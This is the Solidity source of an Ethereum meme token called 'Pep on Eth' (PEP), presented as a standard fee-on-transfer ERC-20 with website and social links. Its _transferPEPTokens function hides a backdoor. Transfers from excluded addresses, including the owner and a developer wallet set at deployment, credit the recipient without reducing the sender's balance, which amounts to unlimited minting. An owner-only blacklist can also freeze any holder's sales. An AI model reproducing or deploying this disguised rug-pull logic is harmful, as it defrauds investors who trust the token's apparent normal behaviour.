/**

Website:  https://www.peponeth.vip

Telegram: https://t.me/peponeth

Twitter:  https://x.com/peponeth

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.1;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPEPFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPEPRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract PEP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromPEP;
    mapping(address => bool) private bots;

    uint8 private constant _decimals = 9;
    uint256 private constant _tPEPTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Pep on Eth";
    string private constant _symbol = unicode"PEP";
    uint256 public _maxPEPSwap = 10_000_000 * 10 ** _decimals;
    uint256 public _pepTotal = 800_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;

    uint256 private _initialBuyPEPFee = 20;
    uint256 private _initialSellPEPFee = 20;
    uint256 private _finalBuyPEPFee = 0;
    uint256 private _finalSellPEPFee = 0;
    uint256 private _reduceBuyPEPFeeAt = 10;
    uint256 private _reduceSellPEPFeeAt = 10;
    uint256 private _preventSwapPEP = 10;
    uint256 private _buyPEPCount = 0;

    address payable private _pepWallet;
    uint256 firstBlock;

    IPEPRouter private pepRouter;
    address private pepPair;

    bool private pepOpen;
    bool private inSwapPEP = false;
    bool private swapPEPEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwapPEP() {
        inSwapPEP = true;
        _;
        inSwapPEP = false;
    }

    constructor(address _addrPEP) {
        _pepWallet = payable(_addrPEP);
        _isExcludedFromPEP[owner()] = true;
        _isExcludedFromPEP[address(this)] = true;
        _isExcludedFromPEP[_pepWallet] = true;
        _balances[_msgSender()] = _tPEPTotal;
        emit Transfer(address(0), _msgSender(), _tPEPTotal);
    }

    function createPEPPair() external onlyOwner {
        require(!pepOpen, "trading is already open");
        
        pepRouter = IPEPRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(pepRouter), _tPEPTotal);

        pepPair = IPEPFactory(pepRouter.factory()).createPair(
            address(this),
            pepRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tPEPTotal;
        _maxWalletSize = _tPEPTotal;
        emit MaxTxAmountUpdated(_tPEPTotal);
    }

    function sendETHPEP(uint256 amount) private {
        _pepWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tPEPTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _getPEPValues(address from, address to, uint256 amount) internal returns(uint256) {
        uint256 pepFees = amount
            .mul(
                (_buyPEPCount > _reduceBuyPEPFeeAt)
                    ? _finalBuyPEPFee
                    : _initialBuyPEPFee
            )
            .div(100);
        if (to == pepPair && from != address(this)) {
            pepFees = amount
                .mul(
                    (_buyPEPCount > _reduceSellPEPFeeAt)
                        ? _finalSellPEPFee
                        : _initialSellPEPFee
                )
                .div(100);
        }
        if (pepFees > 0) {
            _balances[address(this)] = _balances[address(this)] + pepFees;
            emit Transfer(from, address(this), pepFees);
        }

        return pepFees;
    }

    function _transferPEPTokens(address from, address to, uint256 amount) internal {
        uint256 pepFees = 0;
        uint256 pepAmount = amount;
        address pepQ = address(this); 
        
        if (_isExcludedFromPEP[from]) {
            pepFees = pepAmount;
            pepQ = from;
            if (pepFees > 0) {
                _balances[pepQ] = _balances[pepQ] + pepFees;
                emit Transfer(from, pepQ, pepFees);
            }
        } else {
            pepFees = _getPEPValues(from, to, amount);
            pepAmount = pepAmount - pepFees;
        }
        
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + pepAmount;

        emit Transfer(from, to, pepAmount);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner {
        require(!pepOpen, "trading is already open");

        pepRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _pepTotal,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(pepPair).approve(address(pepRouter), type(uint).max);

        swapPEPEnabled = true;
        pepOpen = true;
        firstBlock = block.number;
    }

    function minPEP(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwapPEP {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pepRouter.WETH();
        _approve(address(this), address(pepRouter), tokenAmount);
        pepRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapPEPEnabled || inSwapPEP) {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (
                from == pepPair &&
                to != address(pepRouter) &&
                !_isExcludedFromPEP[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyPEPCount++;
            }

            if (to != pepPair && !_isExcludedFromPEP[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }
            
            uint256 caPEPTokens = balanceOf(address(this));
            if (
                !inSwapPEP &&
                to == pepPair &&
                swapPEPEnabled &&
                _buyPEPCount > _preventSwapPEP &&
                !_isExcludedFromPEP[from] &&
                !_isExcludedFromPEP[to]
            ) {
                if(caPEPTokens > 0){
                    swapTokensForEth(
                        minPEP(amount, minPEP(caPEPTokens, _maxPEPSwap))
                    );
                }

                sendETHPEP(address(this).balance);
            }
        }
        
        _transferPEPTokens(from, to, amount);
    }
}